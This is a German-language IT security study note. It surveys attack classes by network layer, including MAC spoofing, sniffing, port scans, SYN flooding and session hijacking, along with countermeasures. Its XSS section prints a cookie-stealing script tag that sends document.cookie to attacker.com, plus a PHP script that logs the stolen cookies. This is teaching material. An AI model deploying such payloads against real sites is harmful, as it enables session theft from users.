#Informatik #IT-Sicherheit 
# Klassifikation von Verwundbarkeiten und Angriffen
- header-basiert
	- Manipulation der Header-Felder, z.B. alle Bits auf "0"
- protokollbasiert
	- Verstoß gegen die prozessuralen Aspekte / Ablauf eines Protokolls. Eine Verwundbarkeit in einem Protokoll wird ausgenutzt
- authentifizierungsbasiert
	- alle Aspekte in Verbindung mit dem Schutzziel Authentizität, z.B. Eingriffe / Manipulation einer Authentifizierung
- verkehrsdatenbasiert
	- alle Verkehrsdaten sind relevant, z.B. sniffing (Mitlesen mittels Wireshark)

Jede dieser Verwundbarkeiten kann auf jeder Schicht des [[OSI und TCP-IP Referenzmodell|Schichtenmodells]] auftreten. 
Zusätzlich lässt sich der Benutzer auch noch als Layer 8 im [[OSI und TCP-IP Referenzmodell#^42221f|OSI-Referenzmodell]] bezeichnen, welcher mit [[Social Engineering|Social Engineering]] auch angreifbar ist.

# Netzzugangsschicht

## Gängige Angriffsmethoden
### Hardware Address Spoofing
- Fälschen von [[MAC-Adressen]], z.B. im [[Netzwerkprotokolle#Ethernet|Ethernet-Protokoll]]
- "Stehlen" der Rahmen, die für ein anderes Gerät bestimmt sind
- Umgehen einfacher Zugriffsbeschränkungen
	- z.B. MAC-Filterung -> MAC-Adressfilterung ist jedoch veraltet und unpraktisch
- fällt unter authentifizierungsbasiert, weil als jemand anderes ausgeben.
### Mitlesen des Netzwerkverkehrs (Sniffing)
- mitlesbarer Traffic abhängig von Position im Netzwerk
- ggf. zusätzlicher Aufwand notwendig, um alle Rahmen lesen zu können (Switch)
- besonders problematisch in offenen drahtlosen Netzen
### Physische Angriffe
- Angriffe gegen Verkabelung oder Netzwerkkomponenten
- Zerstörung, Manipulation, Sabotage
### Rogue Wireless Access Point
#TODO Rogue Wireless Access Point
### Fake Wireless Access Point
#TODO Fake Wireless Access Point

## Gängige Gegenmaßnahmen
- Verwendung von VLANs
- Zugriffsbeschränkung auf das Netzwerk (Network Access Control)
- WLANs:
	- bei offenen Netzen -> VPNs benutzen
	- nur Verwendung von sicheren Standards (~~WEP~~, ~~WPA~~, WPA2, WPA3)
	- korrekte Konfiguration sicherstellen

# Internetschicht
Siehe [[Netzwerkprotokolle#IPv4|IPv4]] und [[Netzwerkprotokolle#IPv6|IPv6]]

# Transportschicht
## [[Netzwerkprotokolle#TCP|TCP]]-Verbindungsaufbau missbrauchen
### Portscans
- Ermitteln von offenen Ports des Servers. Z.B. mithilfe von [[nmap]].
- Connect-Scan: vollständiger TCP-Verbindungsaufbau
- SYN-Scan: Abbruch nach Antwort des Servers
### Denial-of-Service-Angriff
- Überfluten des Servers mit SYN-Nachrichten
- Verbrauchen sämtlicher Ressourcen für TCP-Verbindungen
- keine Verbindung zu Server-Dienst mehr möglich
-> **SYN-Flooding** z.B. mit [[hping3]].
**Gegenmaßnahmen gegen SYN-Flooding:**
-> SYN-Cookies
- Speichern der für den Verbindungsaufbau benötigten Daten in Sequenznummer

# Anwendungsschicht

# Web Application Security
besteht aus:
- Präsentation der Daten im Webbrowser
- Applikationslogik vom Applikationsserver
- Datenbank im Hintergrund als Persistenz-Schicht

## Session Hijacking
**Definition:** Der Angriff Session Hijacking zielt darauf ab, dass ein Angreifer eine gültige Benutzersitzung (Session) übernimmt, um sich als dieser User auszugeben.

Session-IDs können zum Beispiel an folgenden Stellen auftauchen:
- Als URL-Parameter:
`https://www.domain.com/index.php?id=4711`
- Im Pfad:
`https://www.domain.com/4711/index.php`
- Als Hidden Field im HTML-Code:
`<input type="hidden" name="PHPSESSID" value="4711">`
- Als Cookie:
```
GET /index.php HTTP/1.1
Host: www.domain.com
Cookie: session=4711
```
- Local Storage bzw. Session Storage

## Cross-Site Scripting
**Definition:** Beim Cross-Site Scripting (abgekürzt: XSS) injiziert ein Angreifer schädlichen JavaScript-Code in eine Webseite, der später im Browser anderer Nutzer ausgeführt wird.

### Beispiel
PHP-Skript auf dem Server:
``` php
<?php
	$cookie=($_GET['cookie']);
	$myFile = "CollectedSessions.txt";
	$fh = fopen($myFile, 'a') or die("can't open file");
	$stringData = $cookie."\n";
	fwrite($fh, $stringData);
	fclose($fh);
?>
```
JavaScript Code Injection:
``` html
<script>
	document.location='https://www.attacker.com/cookie_recv.php?cookie='
	+ document.cookie;
</script>
```

## Session Fixation
**Definition:** Bei einer sog. Session Fixation setzt ein Angreifer die Session-ID eines Opfers im Voraus fest und bringt das Opfer dazu, diese Session zu verwenden.
